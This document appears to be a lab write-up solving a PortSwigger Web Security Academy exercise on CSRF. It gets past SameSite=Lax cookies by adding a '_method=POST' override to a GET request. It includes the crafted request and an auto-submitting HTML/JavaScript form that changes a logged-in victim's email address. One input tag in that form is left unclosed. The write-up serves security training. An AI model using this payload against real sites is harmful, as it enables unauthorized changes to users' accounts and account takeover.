# CSRF - SameSite Lax bypass via method override

## 📌 Lab Details
- **Title**: SameSite Lax bypass via method override
- **Difficulty**: Practitioner
- **Category**: Cross-site Request Forgery
- **Lab URL**: https://portswigger.net/academy/labs/launch/ddae9bffdcb03f70c0ece2fac25e236d84670c553a409d983f4d364a96ed45a3?referrer=%2fweb-security%2fcsrf%2fbypassing-samesite-restrictions%2flab-samesite-lax-bypass-via-method-override

## 🔍 Summary
This lab demonstrates a **CSRF** vulnerability where a site uses `SameSite=Lax` restriction which can be bypassed by using **method** spoofing.

## 🛠 Steps to Solve
1. Log in into the given account.
2. Study the **POST change-email** request to observe that **no CSRF** tokens are being used.
3. Study the **POST login** request to observe that no `SameSite` restriction is used which means that the site will use default `SameSite=Lax` restriciton.
4. In **Burp Repeater** send a `GET` request to change email and observe that only `POST` request are allowed.
5. Use the `method` spoofing method to inject: `GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1`. This request is now accepted.
6. Generate a **CSRF PoC** and inject the payload in the Exploit server:
   ```sh
   <html>
   <body>
    <form action="https://0aa70041043c71ce80b1260600950031.web-security-academy.net/my-account/change-email" method="GET">
			 <input type="hidden" name="_method" value="POST"
      <input type="hidden" name="email" value="wiener&#64;newemail1&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
   </body>
   </html>
   ```

## 📖 Key Takeaways
- **SameSite=Lax** allows cookies on cross-site `GET` navigation but not `POST`.
- Using `_method=POST` on a `GET` request **bypasses method restrictions** if the server honors it.
- **No CSRF tokens + SameSite=Lax + method override = CSRF possible.**

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/e103960f-e179-4fe5-888b-781ffce73dbb)
![image](https://github.com/user-attachments/assets/f57d8efb-d445-4452-9297-7acb80dc01d8)
![image](https://github.com/user-attachments/assets/a1e8000b-e50e-4aa4-b51b-61183b9b943e)
![image](https://github.com/user-attachments/assets/8eae212e-997e-4e5e-9602-9b6d2841e28d)
![image](https://github.com/user-attachments/assets/6744d4d8-ac5e-4a2b-867a-993472767ee9)
![image](https://github.com/user-attachments/assets/27364b60-2eae-4111-a0e4-f7a175b70c34)
![image](https://github.com/user-attachments/assets/538ca9e0-d642-403d-94c4-794e2b2a4a13)
![image](https://github.com/user-attachments/assets/39e82ed8-9e2d-4828-92ad-619c4c7edcfc)
